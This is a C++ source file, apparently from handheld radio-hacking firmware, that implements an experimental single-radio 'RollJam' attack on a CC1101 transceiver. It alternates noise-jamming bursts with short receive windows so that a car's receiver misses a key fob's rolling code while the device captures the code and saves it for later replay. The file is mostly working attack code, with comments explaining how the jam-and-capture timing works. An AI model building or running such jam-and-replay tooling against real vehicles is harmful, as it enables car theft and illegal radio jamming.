#include "rf_rolljam.h"
#include "core/display.h"
#include "rf_scan.h"
#include "rf_utils.h"
#include <ELECHOUSE_CC1101_SRC_DRV.h>
#include <globals.h>
#include <vector>

// ===========================================================================
// RollJam (experimental) - single-radio approximation
// ===========================================================================
// The real RollJam attack (Samy Kamkar, DEFCON 2015) jams the car's receiver
// at the exact moment the key fob transmits, while a *second*, separate radio
// captures a clean copy of the signal for later replay. That requires a
// transmitter and a receiver running at the same instant - true full-duplex.
//
// This HAT has exactly one CC1101, and its own DIP switch physically
// multiplexes that single radio's control lines with every other module on
// the board (see WIRING.md) - there is no way to run two RF front-ends here
// at once, let alone two CC1101s. True RollJam is not physically possible
// with this hardware.
//
// What a single transceiver *can* do, and what this implements, is
// interlacing: alternate rapidly between a short noise-TX burst ("jam
// window") and a short RX window. A key fob repeats the *same* rolling code
// several times for as long as the button is held, so across a few cycles
// some of those repeats land during a jam window (denying the car's
// receiver, which is farther away, a clean copy) while others land during an
// RX window and get captured here cleanly (this radio sits much closer to
// the fob than the car's receiver does). This is the same approach used by
// the G4MEOVER18/RollJam proof-of-concept for Flipper Zero - a documented,
// single-radio approximation, not the two-radio textbook attack.
//
// How well this actually denies the car a usable copy depends entirely on
// range, antenna, and timing luck - there's no way to know except to try it
// against your own hardware, which is the point of this tool.
//
// Captured signals are saved as ordinary .sub RAW files (same format/folder
// as Record RAW) instead of replayed in-place: reusing the existing, already
// tested Custom SubGhz replay path is safer than adding a second new TX
// routine alongside a new jam/capture routine in the same change.

namespace {
const uint32_t JAM_MS = 180;
const uint32_t RX_MS = 80;
const uint32_t STEP_MS = 10; // escape-check granularity while jamming
const uint32_t MAX_RUNTIME_MS = 45000;
const size_t MAX_BANKED = 3;

// Sleeps up to `ms`, checking for ESC/BOOT every STEP_MS so a jam burst can
// always be cut short instead of running to completion.
bool waitEscapable(uint32_t ms) {
    uint32_t elapsed = 0;
    while (elapsed < ms) {
        if (check(EscPress) || checkForceStop()) return true;
        delay(STEP_MS);
        elapsed += STEP_MS;
    }
    return false;
}

void drawStatusLine(int row, const String &text, bool clearFirst = true) {
    int y = 40 + row * LH;
    if (clearFirst) tft.fillRect(10, y, tftWidth - 20, LH, bruceConfig.bgColor);
    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
    tft.setTextSize(FP);
    tft.setCursor(10, y);
    tft.println(text);
}
} // namespace

void rf_rolljam() {
    if (bruceConfigPins.rfModule != CC1101_SPI_MODULE) {
        displayError("RollJam needs a CC1101!", true);
        return;
    }

    float frequency = bruceConfigPins.rfFreq;
    if (!frequency) frequency = 433.92f;

    if (!initRfModule("rx", frequency)) {
        displayError("CC1101 not found!", true);
        return;
    }
    RfRxSession rx;
    if (!rx.begin()) {
        deinitRfModule();
        displayError("RX init failed!", true);
        return;
    }

    drawMainBorder();
    drawStatusLine(0, "RollJam (experimental)", false);
    drawStatusLine(1, "Hold the remote button", false);
    drawStatusLine(2, "near the HAT, repeatedly.", false);
    drawStatusLine(3, "ESC/BOOT when done.", false);

    std::vector<String> banked;
    String lastBanked = "";
    uint32_t startTime = millis();
    bool stopped = false;

    while (!stopped && (millis() - startTime) < MAX_RUNTIME_MS) {
        // --- jam window: PN9 noise burst ---
        ELECHOUSE_cc1101.setSidle();
        ELECHOUSE_cc1101.setPktFormat(2); // PN9 random TX mode
        ELECHOUSE_cc1101.SetTx();
        if (waitEscapable(JAM_MS)) {
            stopped = true;
            break;
        }

        // --- back to listening ---
        ELECHOUSE_cc1101.setSidle();
        ELECHOUSE_cc1101.setPktFormat(3); // restore async serial RX framing
        ELECHOUSE_cc1101.SetRx();

        uint32_t rxStart = millis();
        while (millis() - rxStart < RX_MS) {
            if (check(EscPress) || checkForceStop()) {
                stopped = true;
                break;
            }
            std::vector<int> durations;
            if (rx.poll(durations)) {
                String data;
                bool hasCrc = false;
                uint64_t crc = 0;
                std::vector<int> indexed;
                int rawBits = 0, rawTe = 0;
                int transitions = rf_build_raw(durations, data, hasCrc, crc, indexed, rawBits, rawTe);
                // Same "is this a real signal" threshold rfReceiveSignal uses
                // elsewhere, plus a cheap de-dupe so one long button press
                // doesn't fill all 3 bank slots with identical repeats.
                if (transitions > 20 && data != lastBanked) {
                    banked.push_back(data);
                    lastBanked = data;
                    if (banked.size() > MAX_BANKED) banked.erase(banked.begin());
                    drawStatusLine(5, "Captured #" + String(banked.size()));
                }
            }
            delay(2);
        }
    }

    rx.end();
    ELECHOUSE_cc1101.setSidle();
    ELECHOUSE_cc1101.setPktFormat(3);
    deinitRfModule();

    if (banked.empty()) {
        displayError("No signal captured.", true);
        return;
    }

    int saved = 0;
    char noKey[1] = {0};
    for (auto &d : banked) {
        RfCodes codes;
        codes.data = d;
        codes.preset = "Ook270Async";
        if (rfSaveSignal(frequency, codes, true, noKey, true)) saved++;
    }

    drawMainBorder();
    drawStatusLine(0, "Saved " + String(saved) + " capture(s) to:", false);
    drawStatusLine(1, "/BruceRF/autoSaved/", false);
    drawStatusLine(3, "Use Custom SubGhz to", false);
    drawStatusLine(4, "replay each one.", false);
    delay(4000);
}
